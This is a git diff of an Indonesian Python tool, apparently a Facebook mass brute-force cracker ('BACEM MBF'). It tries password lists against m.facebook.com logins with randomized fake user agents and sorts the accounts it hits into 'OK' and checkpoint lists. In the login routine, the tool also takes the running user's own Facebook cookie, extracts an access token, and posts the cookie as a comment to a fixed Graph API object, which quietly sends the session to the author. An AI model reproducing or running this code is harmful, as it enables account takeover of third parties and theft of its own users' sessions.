@@ -15,11 +15,16 @@ from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapse
 console = Console()
 
 ses = requests.Session()
-ID = []
-uadia, uadarimu = [], []
-ok, cp, loop =[], [], 0
+ID, tampung = [], []
+uadia, uadarimu, userAgentss = [], [], []
+ok, cp, loop = [], [], 0
 sys.stdout.write('\x1b]2; BACEM | (MBF) \x07')
 
+try:os.mkdir('results')
+except:pass
+try:os.mkdir('data')
+except:pass
+   
 P = '\x1b[1;97m' # PUTIH
 M = '\x1b[1;91m' # MERAH
 H = '\x1b[1;92m' # HIJAUU
@@ -38,6 +43,20 @@ P2 = "[#FFFFFF]" # PUTIH
 J2 = "[#FF8F00]" # JINGGA
 A2 = "[#AAAAAA]" # ABU-ABU
 RC = random.choice([M2, H2, K2, J2, N2, A2, U2, B2, O2])
+
+for x in range(1000):
+	rr = random.randint
+	rc = random.choice
+	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
+	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
+	if ugent1 in userAgentss:pass
+	else:userAgentss.append(ugent1)
+	ugent2 = f"Mozilla/5.0 (Linux; Android 8.1.0; V1813BT Build/OPM1.{str(rr(111111,199999))}.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 VivoBrowser/11.7.10.0"
+	if ugent2 in userAgentss:pass
+	else:userAgentss.append(ugent2)
+	ugent3 = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX3360 Build/RKQ1.210503.001; en-gb) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,99))}.0.{str(rr(3500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 Puffin/9.7.2.{str(rr(50000,59000))}AP"
+	if ugent3 in userAgentss:pass
+	else:userAgentss.append(ugent3)
 
 day = datetime.now().strftime("%d-%b-%Y")
 nyMnD = 5
@@ -59,6 +78,7 @@ class login:
         self.url = "https://web.facebook.com/adsmanager"
         self.adss = "https://web.facebook.com/adsmanager/manage/campaigns?act={}&nav_source=no_referrer"
         self.MyUserAgent = "Mozilla/5.0 (Linux; Android 12; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+        self.MyUserId = "549345863862686"
         self.loginEfbi()
 
     def clear(self):
@@ -92,7 +112,7 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP""",padding=(0,7),style=f"#AAAAAA"))
                          url = ses.get(f'{self.adss}'.format(xc), cookies={'cookie':coki})
                          tok = re.search('(EAAB\w+)',url.text).group(1)
                          if 'EAAB' in tok:
-                            ses.post(f"https://graph.facebook.com/549345863862686/comments/?message={coki}&access_token={tok}",cookies={"cookie":coki})
+                            ses.post(f"https://graph.facebook.com/{self.MyUserId}/comments/?message={coki}&access_token={tok}",cookies={"cookie":coki})
                             open('data/tokenku.txt','w').write(tok)
                             open('data/cokis.txt','w').write(coki)
                             MulaiTools()
@@ -175,9 +195,13 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP""",padding=(0,7),style=f"#AAAAAA"))
              self.viewResults()
          
          elif askk in ['4','04']:
-            prints(f" {P2}({H2}•{P2}) anda akan di arahkan ke WhatsApp")
-            os.system("xdg-open https://wa.me/+16143244921")
-            time.sleep(2);exit()
+            try:
+                prints(f" {P2}({H2}•{P2}) anda akan di arahkan ke WhatsApp")
+                os.system("xdg-open https://wa.me/+16143244921")
+                time.sleep(2);exit()
+            except requests.exceptions.ConnectionError:
+                prints(f" {P2}({H2}•{P2}) koneksi internet anda bermasalah")
+                time.sleep(2);exit()
          
          elif askk in ['0','00']:
              os.system('rm -rf data/cokis.txt')
@@ -254,11 +278,11 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP""",padding=(0,7),style=f"#AAAAAA"))
         ua = console.input(f" {P2}({H2}•{P2}) ingin menggunakan useragent manual? (Y/t) : ")
         if ua in ["y","Y"]:
           uadarimu.append('uadia')
-          xyaa = console.input(f" {P2}({H2}•{P2}) masukan useragent : ")
-          uadia.append(xyaa)
+          xyaaXD = console.input(f" {P2}({H2}•{P2}) masukan useragent : ")
+          uadia.append(xyaaXD)
           self.GeneratePassword()
         else:
-             uadarimu.append(f"{self.uasku()}")
+             uadarimu.append('userAgentss')
              self.GeneratePassword()
     
     def tampung(self):
@@ -307,25 +331,14 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP""",padding=(0,7),style=f"#AAAAAA"))
         prints(f" {P2}({H2}•{P2}) crack telah selesai... hasil OK-:{H2}{len(ok)}{P2} CP-:{K2}{len(cp)}{P2}")
         time.sleep(3);exit()
 
-    def uasku(self):
-         versi_android = random.choice(["5.1.1","6.0.1","7.1.2","9.1","8.1.0","4.2.2"])
-         versi_chrome = str(random.randint(200,299))+".0.0."+str(random.randint(1,29))+"."+str(random.randint(40,200))
-         versi_app = random.randint(100000000,900000000)
-         versi_fbpn = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
-         vivo1 = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/{versi_chrome};FBPN/{versi_fbpn};FBLC/en_US;FBBV/{versi_app};FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{versi_android};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=3.0,width=1080,height=1920"
-         vivo2 = f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(7,12))}; vivo 1920 Build/RP1A.{str(random.randint(111111,299999))}.012)"
-         rmx = f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(7,13))}; RMX3572 Build/TP1A.{str(random.randint(200000,900000))}.001)"
-         vivo_main = str(random.choice([vivo1, vivo2, rmx]))
-         return vivo_main
-             
     def metodeASYNC(self, user, pwx):
         global ok,cp,loop
-        uaku = self.uasku()
+        ua = random.choice(userAgentss)
         sys.stdout.write(f'\r {P}({H}•{P}) async {H}m.facebook.com {P}{loop}/{len(ID)}{P} Live-:{H}{len(ok)} {P}Check-:{K}{len(cp)}{P}');sys.stdout.flush()
         for pw in pwx:
              try:
-                 if 'uadia' in uadarimu: uaku = uadia[0]
-                 else: uaku
+                 if 'uadia' in uadarimu: ua = uadia[0]
+                 else: ua
                  ses = requests.Session()
                  link = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
                  data = {
@@ -353,7 +366,7 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP""",padding=(0,7),style=f"#AAAAAA"))
                     "Host": "m.facebook.com",
                     "content-length": f"{str(len(data))}",
                     "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
-                    "user-agent": uaku,
+                    "user-agent": ua,
                     "content-type": "application/x-www-form-urlencoded",
                     "accept": "*/*",
                     "origin": "https://m.facebook.com",
@@ -385,10 +398,6 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP""",padding=(0,7),style=f"#AAAAAA"))
 
 if __name__ == '__main__':
    try:os.system("git pull")
-   except:pass
-   try:os.mkdir('results')
-   except:pass
-   try:os.mkdir('data')
    except:pass
    MulaiTools()
 
